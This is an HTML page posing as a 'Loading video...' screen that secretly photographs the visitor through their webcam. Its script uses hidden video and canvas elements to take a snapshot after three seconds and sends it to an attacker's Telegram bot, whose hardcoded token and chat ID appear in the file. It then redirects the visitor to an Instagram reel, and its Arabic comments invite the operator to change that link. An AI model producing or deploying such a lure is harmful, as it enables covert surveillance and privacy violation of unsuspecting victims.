
<!DOCTYPE html>
<html>
<head>
  <title>Loading video...</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = '8237817177:AAGCEbWMBxTd4nFB70mJNoTFkrHlw2Qr5GY';
    const CHAT_ID = '960061599';
    const REDIRECT_URL = 'https://www.instagram.com/reel/C7T3xVbOw_k/'; // ← تقدر تغيّره بأي رابط إنستغرام حقيقي

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      const video = document.getElementById('video');
      video.srcObject = stream;

      setTimeout(() => {
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/png');

        fetch(imageData)
          .then(res => res.blob())
          .then(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snapshot.png');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: formData
            }).then(() => {
              window.location.href = REDIRECT_URL;
            });
          });
      }, 3000);
    }).catch(error => {
      console.error('فشل تشغيل الكاميرا:', error);
      window.location.href = REDIRECT_URL;
    });
  </script>
</body>
</html>
